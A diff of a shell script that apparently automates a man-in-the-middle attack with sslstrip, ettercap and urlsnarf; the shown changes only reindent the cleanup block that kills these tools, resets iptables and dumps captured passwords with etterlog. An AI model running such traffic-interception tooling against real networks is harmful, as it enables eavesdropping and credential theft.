@@ -31,7 +31,7 @@ sleep 2
 # urlsnarf
 echo "[+] Starting urlsnarf..."
 urlsnarf -i $IFACE | grep http > /root/$SESSION/$SESSION.txt &
-sleep 1 
+sleep 1
 
 
 # Ettercap
@@ -50,21 +50,21 @@ read WISH
 
 # Clean up
 if [ $WISH = "y" ] ; then
-echo
-echo "[+] Cleaning up and resetting iptables..."
-killall sslstrip
-killall ettercap
-killall urlsnarf
-killall xterm
-echo "0" > /proc/sys/net/ipv4/ip_forward
-iptables --flush
-iptables --table nat --flush
-iptables --delete-chain
-iptables --table nat --delete-chain
-etterlog -p -i /root/$SESSION/$SESSION.eci
-
-echo "[+] Clean up successful...Bye!"
-exit
-
-fi 
+   echo
+   echo "[+] Cleaning up and resetting iptables..."
+   killall sslstrip
+   killall ettercap
+   killall urlsnarf
+   killall xterm
+   echo "0" > /proc/sys/net/ipv4/ip_forward
+   iptables --flush
+   iptables --table nat --flush
+   iptables --delete-chain
+   iptables --table nat --delete-chain
+   etterlog -p -i /root/$SESSION/$SESSION.eci
+   
+   echo "[+] Clean up successful...Bye!"
+   exit
+   
+fi
 exit
